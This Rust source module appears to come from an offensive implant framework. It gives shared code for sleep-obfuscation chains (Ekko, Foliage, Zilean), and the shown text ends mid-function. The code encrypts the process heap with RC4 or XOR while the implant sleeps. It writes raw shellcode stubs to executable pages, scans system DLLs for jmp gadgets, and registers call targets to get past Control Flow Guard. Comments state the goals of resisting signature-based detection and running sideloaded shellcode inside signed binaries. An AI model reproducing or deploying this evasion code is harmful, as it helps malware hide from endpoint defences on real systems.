//! Shared infrastructure for sleep obfuscation techniques.
//!
//! This module provides the building blocks used by all three chain-based techniques
//! (Ekko, Foliage, Zilean): encryption key generation, heap encryption, JMP gadget
//! scanning, shellcode stub allocation, CFG bypass, stack layout spoofing, and thread
//! context spoofing.

use {
    api::{
        api::{Api, MemorySection},
        util::memzero,
        windows::*,
        NT_SUCCESS,
    },
    core::{
        ffi::c_void,
        mem::{size_of, zeroed},
        ptr::null_mut,
    },
};

/// Size of the RC4 encryption key in bytes.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
pub const KEY_SIZE: usize = 16;

/// Alphanumeric character set used to generate random encryption keys.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
pub const KEY_VALS: &[u8; 62] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

/// 128-byte repeating XOR key used by the `sleep-xor` feature for memory masking.
#[cfg(feature = "sleep-xor")]
pub const XORKEY: [u8; 128] = [
    0x4a, 0x7b, 0x2f, 0x91, 0xe3, 0x5d, 0xc8, 0x16, 0xa9, 0x3e, 0xf2, 0x84, 0x0b, 0x6d, 0xd7, 0x53,
    0xbe, 0x29, 0x95, 0x41, 0xfc, 0x68, 0x1a, 0xe6, 0x7f, 0xc3, 0x0d, 0x9a, 0x52, 0xb4, 0x27, 0xdf,
    0x8c, 0x15, 0x63, 0xaa, 0x3b, 0xf9, 0x4e, 0x81, 0xd2, 0x06, 0x74, 0xcd, 0x38, 0xef, 0x5a, 0x97,
    0x1c, 0xb0, 0x49, 0xe5, 0x22, 0x8f, 0xdb, 0x66, 0x03, 0x7c, 0xa1, 0x34, 0xf5, 0x58, 0xca, 0x2d,
    0x9e, 0x13, 0x6a, 0xbc, 0x47, 0xd9, 0x04, 0x72, 0xe8, 0x35, 0x8b, 0x5f, 0xc1, 0x26, 0xad, 0x60,
    0xf7, 0x1e, 0x93, 0x4c, 0xda, 0x09, 0x75, 0xe1, 0x3c, 0xa8, 0x57, 0xce, 0x2a, 0x86, 0xfb, 0x44,
    0xb3, 0x0f, 0x69, 0xd5, 0x31, 0x9c, 0x48, 0xec, 0x17, 0x7a, 0xc5, 0x02, 0xaf, 0x5b, 0xe0, 0x33,
    0x8d, 0x42, 0xf1, 0x1b, 0x67, 0xdc, 0x28, 0x94, 0x4f, 0xba, 0x0e, 0x73, 0xd1, 0x3a, 0xa5, 0x59,
];

/// Apply a repeating 128-byte XOR mask over `len` bytes starting at `data`.
///
/// # Arguments
///
/// * `data` - Pointer to the start of the memory region to XOR.
/// * `len` - Number of bytes to XOR.
///
/// # Safety
///
/// `data` must point to at least `len` bytes of writable memory.
#[cfg(feature = "sleep-xor")]
#[link_section = ".text$E"]
pub unsafe fn apply_xor_mask(data: *mut u8, len: usize) {
    for i in 0..len {
        *data.add(i) ^= XORKEY[i % 128];
    }
}

/// Generate a random 16-byte alphanumeric encryption key using `RtlRandomEx`.
///
/// The key is stored in `api.advapi.enckey` and used by `SystemFunction032` (RC4)
/// for heap encryption.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers. The generated key is written to `api.advapi.enckey`.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$E"]
pub unsafe fn generate_encryption_key(api: &mut Api) {
    let mut seed: ULONG = 1337;

    for i in 0..KEY_SIZE {
        seed = api.ntdll.RtlRandomEx(&mut seed);
        api.advapi.enckey[i] = KEY_VALS[(seed % 61) as usize];
    }
}

/// Encrypt all busy heap allocations in-place using RC4 (`SystemFunction032`).
///
/// Walks the process heap via `RtlWalkHeap`, encrypting each busy entry with the
/// key stored in `api.advapi.enckey`. Zeroes all local structs after use.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers with encryption key in `api.advapi.enckey`.
///
/// # Safety
///
/// `Api` function pointers must be resolved. The heap must not be concurrently modified.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$E"]
pub unsafe fn encrypt_heap_rc4(api: &mut Api) {
    let mut s32key = USTRING {
        Length: KEY_SIZE as _,
        MaximumLength: KEY_SIZE as _,
        Buffer: api.advapi.enckey.as_mut_ptr() as _,
    };

    let mut s32data = USTRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: null_mut(),
    };

    let mut entry: RTL_HEAP_WALK_ENTRY = zeroed();

    // Step 1) Walk the heap and RC4-encrypt each busy allocation
    while NT_SUCCESS!(api.ntdll.RtlWalkHeap(api.sleep.heap, &mut entry)) {
        if entry.Flags & RTL_PROCESS_HEAP_ENTRY_BUSY != 0 {
            s32data.Length = entry.DataSize as u32;
            s32data.MaximumLength = entry.DataSize as u32;
            s32data.Buffer = entry.DataAddress as _;
            api.advapi.SystemFunction032(&mut s32data, &mut s32key);
        }
    }

    // Step 2) Zero all local structs to avoid leaking key material on the stack
    memzero(&mut s32data as *mut _ as *mut u8, size_of::<USTRING>() as _);
    memzero(&mut s32key as *mut _ as *mut u8, size_of::<USTRING>() as _);
    memzero(
        &mut entry as *mut _ as *mut u8,
        size_of::<RTL_HEAP_WALK_ENTRY>() as _,
    );
}

/// XOR all busy heap allocations using [`apply_xor_mask`].
///
/// Walks the process heap and applies the repeating 128-byte XOR key to each busy entry.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers with heap handle in `api.sleep.heap`.
///
/// # Safety
///
/// `Api` function pointers must be resolved. The heap must not be concurrently modified.
#[cfg(feature = "sleep-xor")]
#[link_section = ".text$E"]
pub unsafe fn xor_heap(api: &mut Api) {
    let mut entry: RTL_HEAP_WALK_ENTRY = zeroed();

    while NT_SUCCESS!(api.ntdll.RtlWalkHeap(api.sleep.heap, &mut entry)) {
        if entry.Flags & RTL_PROCESS_HEAP_ENTRY_BUSY != 0 {
            apply_xor_mask(entry.DataAddress as _, entry.DataSize as _);
        }
    }

    memzero(
        &mut entry as *mut _ as *mut u8,
        size_of::<RTL_HEAP_WALK_ENTRY>() as _,
    );
}

/// Check whether Control Flow Guard (CFG) is enforced for the current process.
///
/// Queries `NtQueryInformationProcess` with `ProcessControlFlowGuardPolicy`.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
///
/// # Returns
///
/// `true` if CFG is active and `SetProcessValidCallTargets` is available, `false` otherwise.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn is_cfg_enforced(api: &mut Api) -> bool {
    let mut pr_info = EXTENDED_PROCESS_INFORMATION {
        ExtendedProcessInfo: PROCESS_MITIGATION_POLICY::ProcessControlFlowGuardPolicy as u32,
        ExtendedProcessInfoBuffer: 0,
    };

    if api.ntdll.NtQueryInformationProcess_ptr != null_mut()
        && api.kernelbase.SetProcessValidCallTargets_ptr != null_mut()
    {
        if NT_SUCCESS!(api.ntdll.NtQueryInformationProcess(
            -1isize as _,
            ProcessCookie | ProcessUserModeIOPL,
            &mut pr_info as *mut _ as *mut c_void,
            core::mem::size_of::<EXTENDED_PROCESS_INFORMATION>() as _,
            null_mut()
        )) {
            return true;
        }
    }

    return false;
}

/// Register a function pointer as a valid CFG indirect call target.
///
/// If CFG is enforced, calls `SetProcessValidCallTargets` to add `func_ptr` to the
/// CFG bitmap for `module`. This prevents CFG from terminating the process when
/// timer/wait/APC callbacks jump to our stubs and NT functions.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
/// * `module` - Base address of the loaded module containing `func_ptr`.
/// * `func_ptr` - The function address to register as a valid call target.
///
/// # Returns
///
/// `STATUS_SUCCESS` on success or if CFG is not enforced, otherwise the last NT error.
///
/// # Safety
///
/// `module` must be a valid loaded module base. `func_ptr` must point within `module`.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn set_valid_call_targets(
    api: &mut Api,
    module: HANDLE,
    func_ptr: *mut c_void,
) -> NTSTATUS {
    if is_cfg_enforced(api) {
        // Step 1) Parse PE headers to get image size
        let dos_header = module as *mut IMAGE_DOS_HEADER;
        let nt_header =
            (module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;

        let size_of_image = (*nt_header).OptionalHeader.SizeOfImage;
        let length = (size_of_image + 0x1000 - 1) & !(0x1000 - 1);

        // Step 2) Build CFG_CALL_TARGET_INFO with offset relative to module base
        let mut cf_info = CFG_CALL_TARGET_INFO {
            Offset: (func_ptr as usize - module as usize),
            Flags: CFG_CALL_TARGET_VALID,
        };

        // Step 3) Register the target in the CFG bitmap
        let ok = api.kernelbase.SetProcessValidCallTargets(
            (-1isize) as HANDLE,
            module,
            length as _,
            1,
            &mut cf_info,
        );

        if ok == 0 {
            return (*NtCurrentTeb()).LastErrorValue as NTSTATUS;
        }
    }
    return STATUS_SUCCESS;
}

/// Register any address as a valid CFG indirect call target, whether it lives
/// inside a loaded module or on a freshly allocated RX page.
///
/// [`set_valid_call_targets`] only handles module-internal addresses (it needs
/// the module base to compute the bitmap offset). The Ekko chain also dispatches
/// into raw RX pages - the timer callback stubs - and into mid-module gadget
/// addresses. In a CFG-enabled process (e.g. shellcode sideloaded into a signed,
/// CFG-hardened binary) ntdll's timer dispatch indirect-calls those stubs, and
/// an unregistered target terminates the process with an access violation.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn set_valid_call_target_any(api: &mut Api, addr: u64) {
    // Registered relative to its containing module when possible
    let modules = [
        api.ntdll.handle as u64,
        api.kernel32.handle as u64,
        api.kernelbase.handle as u64,
    ];
    for module in modules {
        if module == 0 {
            continue;
        }
        let dos = module as usize as *mut IMAGE_DOS_HEADER;
        let nt = (module as usize + (*dos).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
        let size = (*nt).OptionalHeader.SizeOfImage as u64;
        if addr >= module && addr < module + size {
            set_valid_call_targets(api, module as usize as HANDLE, addr as *mut c_void);
            return;
        }
    }

    // Raw RX page (NtAllocateVirtualMemory stub): register page-relative.
    // Called unconditionally - a no-op cost on non-CFG processes.
    let mut cf_info = CFG_CALL_TARGET_INFO {
        Offset: 0,
        Flags: CFG_CALL_TARGET_VALID,
    };
    api.kernelbase.SetProcessValidCallTargets(
        (-1isize) as HANDLE,
        (addr & !0xFFFu64) as *mut c_void,
        0x1000,
        1,
        &mut cf_info,
    );
}

/// Allocate and write the trampoline shellcode stub (8 bytes, RX).
///
/// The trampoline adapts timer/wait callback signatures to `RtlCaptureContext`:
/// ```text
/// 48 89 D1    mov rcx, rdx       ; callback arg2 (CONTEXT ptr) -> arg1
/// 48 31 D2    xor rdx, rdx       ; clear rdx
/// FF 21       jmp [rcx]          ; jump to [ctx.P1Home] = RtlCaptureContext
/// ```
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
///
/// # Returns
///
/// `Some(addr)` with the RX page address on success, `None` on allocation failure.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(feature = "sleep-ekko", feature = "sleep-zilean"))]
#[link_section = ".text$D"]
pub unsafe fn alloc_trampoline(api: &mut Api) -> Option<u64> {
    // 48 89 D1  mov rcx, rdx    ; shuffle callback arg2 -> arg1
    // 48 31 D2  xor rdx, rdx    ; zero rdx
    // FF 21     jmp [rcx]       ; indirect jump through CONTEXT.P1Home
    let trampoline = &[0x48, 0x89, 0xD1, 0x48, 0x31, 0xD2, 0xFF, 0x21];

    // Step 1) Allocate RW page
    let mut size = trampoline.len();
    let mut addr = null_mut();
    if !NT_SUCCESS!(api.ntdll.NtAllocateVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        0,
        &mut size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )) {
        api::log_info!(b"[COMMON] alloc_trampoline: NtAllocateVirtualMemory failed");
        return None;
    }

    // Step 2) Write shellcode bytes
    api::util::memcopy(
        addr as *mut u8,
        trampoline.as_ptr(),
        trampoline.len() as u32,
    );

    // Step 3) Change to RX
    let mut old_protect = 0;
    if !NT_SUCCESS!(api.ntdll.NtProtectVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        &mut size,
        PAGE_EXECUTE_READ as u32,
        &mut old_protect
    )) {
        api::log_info!(b"[COMMON] alloc_trampoline: NtProtectVirtualMemory RX failed");
        return None;
    }

    // Step 4) Lock page in physical memory
    api.ntdll
        .NtLockVirtualMemory(-1isize as HANDLE, &mut addr, &mut size, VM_LOCK_1);
    api::log_info!(b"[COMMON] alloc_trampoline: ok", addr);
    Some(addr as u64)
}

/// Allocate and write the callback shellcode stub (9 bytes, RX).
///
/// The callback stub drives the NtContinue chain - each timer/wait/APC fires this:
/// ```text
/// 48 89 D1       mov rcx, rdx       ; callback arg2 (CONTEXT ptr) -> rcx (arg1 for NtContinue)
/// 48 8B 41 78    mov rax, [rcx+0x78] ; load CONTEXT.Rax = NtContinue ptr
/// FF E0          jmp rax             ; jump to NtContinue(ctx)
/// ```
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
///
/// # Returns
///
/// `Some(addr)` with the RX page address on success, `None` on allocation failure.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(feature = "sleep-ekko", feature = "sleep-zilean"))]
#[link_section = ".text$D"]
pub unsafe fn alloc_callback(api: &mut Api) -> Option<u64> {
    // 48 89 D1        mov rcx, rdx       ; CONTEXT ptr from callback arg2
    // 31 D2           xor edx, edx       ; NtContinue arg2 (TestAlert) = FALSE -
    //                                   ; rdx still held the Context pointer here,
    //                                   ; which NtContinue reads as TRUE and forces
    //                                   ; APC delivery on the pool thread mid-chain
    // 48 8B 41 78     mov rax, [rcx+0x78]; load ctx->Rax (NtContinue address)
    // FF E0           jmp rax            ; jump to NtContinue
    let callback = &[0x48, 0x89, 0xD1, 0x31, 0xD2, 0x48, 0x8B, 0x41, 0x78, 0xFF, 0xE0];

    // Step 1) Allocate RW page
    let mut size = callback.len();
    let mut addr = null_mut();
    if !NT_SUCCESS!(api.ntdll.NtAllocateVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        0,
        &mut size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )) {
        api::log_info!(b"[COMMON] alloc_callback: NtAllocateVirtualMemory failed");
        return None;
    }

    // Step 2) Write shellcode bytes
    api::util::memcopy(addr as *mut u8, callback.as_ptr(), callback.len() as u32);

    // Step 3) Change to RX
    let mut old_protect = 0;
    if !NT_SUCCESS!(api.ntdll.NtProtectVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        &mut size,
        PAGE_EXECUTE_READ as u32,
        &mut old_protect
    )) {
        api::log_info!(b"[COMMON] alloc_callback: NtProtectVirtualMemory RX failed");
        return None;
    }

    // Step 4) Lock page in physical memory
    api.ntdll
        .NtLockVirtualMemory(-1isize as HANDLE, &mut addr, &mut size, VM_LOCK_1);
    api::log_info!(b"[COMMON] alloc_callback: ok", addr);
    Some(addr as u64)
}

/// Allocate and write the set-event shellcode stub (19 bytes, RX).
///
/// Signals an event from a timer/wait callback to notify the main thread:
/// ```text
/// 48 89 D1                mov rcx, rdx       ; callback arg2 (event handle)
/// 31 D2                   xor edx, edx       ; second arg = 0
/// FF 25 00 00 00 00       jmp [rip+0]        ; indirect jump to NtSetEvent
/// XX XX XX XX XX XX XX XX ; <-- NtSetEvent function pointer (patched at runtime)
/// ```
///
/// # Arguments
///
/// * `api` - Resolved API function pointers. `api.ntdll.NtSetEvent_ptr` is embedded in the stub.
///
/// # Returns
///
/// `Some(addr)` with the RX page address on success, `None` on allocation failure.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(feature = "sleep-ekko", feature = "sleep-zilean"))]
#[link_section = ".text$D"]
pub unsafe fn alloc_set_event_stub(api: &mut Api) -> Option<u64> {
    // Step 1) Allocate RW page (20 bytes: 11 code + 8 pointer + 1 pad)
    let mut size = 20usize;
    let mut addr = null_mut();
    if !NT_SUCCESS!(api.ntdll.NtAllocateVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        0,
        &mut size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )) {
        api::log_info!(b"[COMMON] alloc_set_event_stub: NtAllocateVirtualMemory failed");
        return None;
    }

    // Step 2) Write shellcode bytes
    let p = addr as *mut u8;
    // 48 89 D1     mov rcx, rdx        ; event handle from callback arg2
    p.add(0).write(0x48);
    p.add(1).write(0x89);
    p.add(2).write(0xD1);
    // 31 D2        xor edx, edx        ; second arg = 0
    p.add(3).write(0x31);
    p.add(4).write(0xD2);
    // FF 25 00000000  jmp [rip+0]      ; indirect jump to address at next 8 bytes
    p.add(5).write(0xFF);
    p.add(6).write(0x25);
    p.add(7).write(0x00);
    p.add(8).write(0x00);
    p.add(9).write(0x00);
    p.add(10).write(0x00);
    // Inline NtSetEvent function pointer (8 bytes, written at runtime)
    (p.add(11) as *mut u64).write_unaligned(api.ntdll.NtSetEvent_ptr as u64);

    // Step 3) Change to RX
    let mut old_protect = 0;
    if !NT_SUCCESS!(api.ntdll.NtProtectVirtualMemory(
        -1isize as HANDLE,
        &mut addr,
        &mut size,
        PAGE_EXECUTE_READ as u32,
        &mut old_protect
    )) {
        api::log_info!(b"[COMMON] alloc_set_event_stub: NtProtectVirtualMemory RX failed");
        return None;
    }

    // Step 4) Lock page in physical memory
    api.ntdll
        .NtLockVirtualMemory(-1isize as HANDLE, &mut addr, &mut size, VM_LOCK_1);
    api::log_info!(b"[COMMON] alloc_set_event_stub: ok", addr);
    Some(addr as u64)
}

/// x64 general-purpose register targeted by a JMP gadget.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reg {
    /// `FF E7` - `jmp rdi`
    Rdi,
    /// `41 FF E2` - `jmp r10`
    R10,
    /// `41 FF E3` - `jmp r11`
    R11,
    /// `41 FF E4` - `jmp r12`
    R12,
    /// `41 FF E5` - `jmp r13`
    R13,
    /// `41 FF E6` - `jmp r14`
    R14,
    /// `41 FF E7` - `jmp r15`
    R15,
}

/// Byte patterns for each `jmp <reg>` gadget and the corresponding [`Reg`].
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
/// Inline byte scan for a 2-byte or 3-byte gadget pattern in a memory region.
/// Returns the offset of the first match, or `usize::MAX` if not found.
/// Uses raw pointers to avoid slice references to static data (PIC-safe).
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
#[inline(always)]
unsafe fn scan_gadget(base: *const u8, len: usize, b0: u8, b1: u8, b2: i16) -> usize {
    let need = if b2 >= 0 { 3 } else { 2 };
    let mut i = 0usize;
    while i + need <= len {
        if *base.add(i) == b0 && *base.add(i + 1) == b1 {
            if b2 < 0 || *base.add(i + 2) == b2 as u8 {
                return i;
            }
        }
        i += 1;
    }
    usize::MAX
}

/// A JMP gadget found in a legitimate DLL's `.text` section.
///
/// Used to hide the real call target: `ctx.Rip` is set to `addr` (the gadget), and
/// the actual NT function address goes into the register specified by `reg`.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Debug, Clone, Copy)]
pub struct JmpGadget {
    /// Address of the gadget instruction within a system DLL.
    pub addr: u64,
    /// Which register the gadget jumps through.
    pub reg: Reg,
}

/// Locate the `.text` section of a PE module by walking its section headers.
///
/// # Arguments
///
/// * `base` - Base address of a loaded PE module.
///
/// # Returns
///
/// `Some((ptr, size))` with a pointer to `.text` and its virtual size, or `None` if
/// the module base is null or the PE headers are invalid.
///
/// # Safety
///
/// `base` must be the base address of a valid loaded PE module.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn get_text_section(base: usize) -> Option<(*const u8, usize)> {
    if base == 0 {
        return None;
    }

    // Step 1) Validate DOS header
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    // Step 2) Validate NT headers
    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    // Step 3) Walk section headers to find ".text"
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = IMAGE_FIRST_SECTION(nt as *mut _);

    for i in 0..num_sections {
        let section = &*first_section.add(i);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let ptr = (base + section.VirtualAddress as usize) as *const u8;
            let size = section.Misc.virtual_size as usize;
            return Some((ptr, size));
        }
    }

    None
}

/// Scan ntdll, kernel32, and kernelbase `.text` sections for `jmp <reg>` gadgets.
///
/// Collects up to 21 candidates (7 patterns x 3 DLLs), then picks one at random
/// using `rdtsc` as a seed. A different gadget is chosen each run to resist
/// signature-based detection.
///
/// # Arguments
///
/// * `api` - Resolved API with loaded module handles for ntdll, kernel32, and kernelbase.
///
/// # Returns
///
/// `Some(JmpGadget)` with the randomly selected gadget, or `None` if no gadgets found.
///
/// # Safety
///
/// `Api` module handles must point to valid loaded DLLs.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn find_jmp_gadgets(api: &Api) -> Option<JmpGadget> {
    let mut all_gadgets: [Option<JmpGadget>; 21] = [None; 21];
    let mut count = 0usize;

    // 7 gadget patterns: (byte0, byte1, byte2_or_neg1, register)
    // byte2 = -1 means 2-byte pattern, >= 0 means 3-byte pattern
    let patterns: [(u8, u8, i16, Reg); 7] = [
        (0xFF, 0xE7, -1, Reg::Rdi),   // jmp rdi
        (0x41, 0xFF, 0xE2, Reg::R10), // jmp r10
        (0x41, 0xFF, 0xE3, Reg::R11), // jmp r11
        (0x41, 0xFF, 0xE4, Reg::R12), // jmp r12
        (0x41, 0xFF, 0xE5, Reg::R13), // jmp r13
        (0x41, 0xFF, 0xE6, Reg::R14), // jmp r14
        (0x41, 0xFF, 0xE7, Reg::R15), // jmp r15
    ];

    let module_bases = [api.ntdll.handle, api.kernel32.handle, api.kernelbase.handle];

    // Step 1) Scan .text section of each DLL for all 7 jmp patterns
    let mut m = 0usize;
    while m < 3 {
        if let Some((text_ptr, text_size)) = get_text_section(module_bases[m]) {
            let mut seen = [false; 7];
            let mut p = 0usize;
            while p < 7 {
                if !seen[p] {
                    let (b0, b1, b2, reg) = patterns[p];
                    let pos = scan_gadget(text_ptr, text_size, b0, b1, b2);
                    if pos != usize::MAX && count < 21 {
                        all_gadgets[count] = Some(JmpGadget {
                            addr: text_ptr as u64 + pos as u64,
                            reg,
                        });
                        count += 1;
                        seen[p] = true;
                    }
                }
                p += 1;
            }
        }
        m += 1;
    }

    if count == 0 {
        return None;
    }

    // Step 2) Pick a random gadget using CPU timestamp counter
    let seed = core::arch::x86_64::_rdtsc() as usize;
    all_gadgets[seed % count]
}

/// Configure a CONTEXT to call `target` through a JMP gadget indirection.
///
/// Sets `ctx.Rip` to the gadget address, and places `target` in the register that
/// the gadget jumps through (e.g., if the gadget is `jmp rdi`, sets `ctx.Rdi = target`).
///
/// # Arguments
///
/// * `gadget` - The JMP gadget to route through.
/// * `ctx` - The CONTEXT to configure.
/// * `target` - The actual NT function address to call.
///
/// # Safety
///
/// `ctx` must be a valid mutable CONTEXT. `target` must be a valid function pointer.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn jmp_ctx(gadget: &JmpGadget, ctx: &mut CONTEXT, target: u64) {
    ctx.Rip = gadget.addr;
    match gadget.reg {
        Reg::Rdi => ctx.Rdi = target,
        Reg::R10 => ctx.R10 = target,
        Reg::R11 => ctx.R11 = target,
        Reg::R12 => ctx.R12 = target,
        Reg::R13 => ctx.R13 = target,
        Reg::R14 => ctx.R14 = target,
        Reg::R15 => ctx.R15 = target,
    }
}

/// The kind of RBX redirect gadget found in kernelbase.dll.
///
/// Determines the shellcode written by [`alloc_gadget_rbp`]: `call [rbx]` pushes a
/// return address that must be handled, while `jmp [rbx]` does not.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Clone, Copy, Debug)]
pub enum GadgetKind {
    /// `FF 13` - `call [rbx]` (pushes return address, needs `sub [rsp], 2` prefix).
    Call,
    /// `FF 23` - `jmp [rbx]` (no push, simpler shellcode).
    Jmp,
}

#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
impl GadgetKind {
    /// Return the gadget-rbp shellcode bytes for this gadget kind.
    ///
    /// Both variants end with `mov rsp, rbp; ret` to restore the real stack pointer.
    /// The `Call` variant prepends `sub [rsp], 2` to neutralize the pushed return address.
    ///
    /// # Returns
    ///
    /// A static byte slice containing the shellcode (4 bytes for `Jmp`, 9 bytes for `Call`).
    pub fn bytes(self) -> &'static [u8] {
        match self {
            // call [rbx] variant (9 bytes):
            // 48 83 2C 24 02  sub [rsp], 2   ; neutralize pushed return address
            // 48 89 EC        mov rsp, rbp   ; restore original stack pointer
            // C3              ret            ; return to NtContinue for next chain step
            GadgetKind::Call => &[0x48, 0x83, 0x2C, 0x24, 0x02, 0x48, 0x89, 0xEC, 0xC3],
            // jmp [rbx] variant (4 bytes):
            // 48 89 EC  mov rsp, rbp  ; restore original stack pointer
            // C3        ret           ; return to NtContinue for next chain step
            GadgetKind::Jmp => &[0x48, 0x89, 0xEC, 0xC3],
        }
    }
}

/// Detect whether kernelbase contains a `call [rbx]` or `jmp [rbx]` gadget.
///
/// Checks for `FF 13` (`call [rbx]`) first, then `FF 23` (`jmp [rbx]`).
///
/// # Arguments
///
/// * `api` - Resolved API with `api.kernelbase.handle` pointing to a loaded kernelbase.
///
/// # Returns
///
/// The [`GadgetKind`] found, or `None` if neither gadget exists in kernelbase.
///
/// # Safety
///
/// `api.kernelbase.handle` must be a valid loaded module base.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn detect_gadget_kind(api: &Api) -> Option<GadgetKind> {
    let kb_base = api.kernelbase.handle;
    let (pdata, pdata_count) = uwd::stack::find_pdata(kb_base as *mut u8)?;

    if uwd::stack::find_gadget(kb_base, &[0xFF, 0x13], pdata, pdata_count).is_some() {
        Some(GadgetKind::Call)
    } else if uwd::stack::find_gadget(kb_base, &[0xFF, 0x23], pdata, pdata_count).is_some() {
        Some(GadgetKind::Jmp)
    } else {
        None
    }
}

/// Allocate the gadget-rbp shellcode: two pages for the `mov rsp, rbp; ret` trampoline.
///
/// Step 1) Allocate an RW page and write the shellcode (4 or 9 bytes depending on `kind`).
/// Step 2) Change the shellcode page to RX.
/// Step 3) Allocate an RW pointer page containing a pointer to the shellcode page.
///
/// The RW pointer page address is returned - `ctx.Rbx` will point here. Since
/// `call/jmp [rbx]` dereferences `rbx`, it reads the pointer and jumps to the shellcode.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
/// * `kind` - Whether kernelbase uses `call [rbx]` or `jmp [rbx]`.
///
/// # Returns
///
/// `Some(ptr_page_addr)` with the RW pointer page address, or `None` on failure.
///
/// # Safety
///
/// `Api` function pointers must be resolved.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn alloc_gadget_rbp(api: &mut Api, kind: GadgetKind) -> Option<u64> {
    let code = kind.bytes();

    // Step 1) Allocate RW page and write shellcode
    let mut code_size = code.len();
    let mut code_addr = null_mut();
    if !NT_SUCCESS!(api.ntdll.NtAllocateVirtualMemory(
        -1isize as HANDLE,
        &mut code_addr,
        0,
        &mut code_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )) {
        api::log_info!(b"[COMMON] alloc_gadget_rbp: code page alloc failed");
        return None;
    }

    api::util::memcopy(code_addr as *mut u8, code.as_ptr(), code.len() as u32);

    // Step 2) Change shellcode page to RX and lock in memory
    let mut old_protect = 0;
    if !NT_SUCCESS!(api.ntdll.NtProtectVirtualMemory(
        -1isize as HANDLE,
        &mut code_addr,
        &mut code_size,
        PAGE_EXECUTE_READ as u32,
        &mut old_protect,
    )) {
        api::log_info!(b"[COMMON] alloc_gadget_rbp: code page RX failed");
        return None;
    }

    api.ntdll
        .NtLockVirtualMemory(-1isize as HANDLE, &mut code_addr, &mut code_size, VM_LOCK_1);

    // Step 3) Allocate RW pointer page (ctx.Rbx points here; call/jmp [rbx] dereferences it)
    let mut ptr_size = size_of::<u64>();
    let mut ptr_addr = null_mut();
    if !NT_SUCCESS!(api.ntdll.NtAllocateVirtualMemory(
        -1isize as HANDLE,
        &mut ptr_addr,
        0,
        &mut ptr_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )) {
        api::log_info!(b"[COMMON] alloc_gadget_rbp: pointer page alloc failed");
        return None;
    }

    // Write pointer to shellcode at start of pointer page
    (ptr_addr as *mut u64).write(code_addr as u64);
    api.ntdll
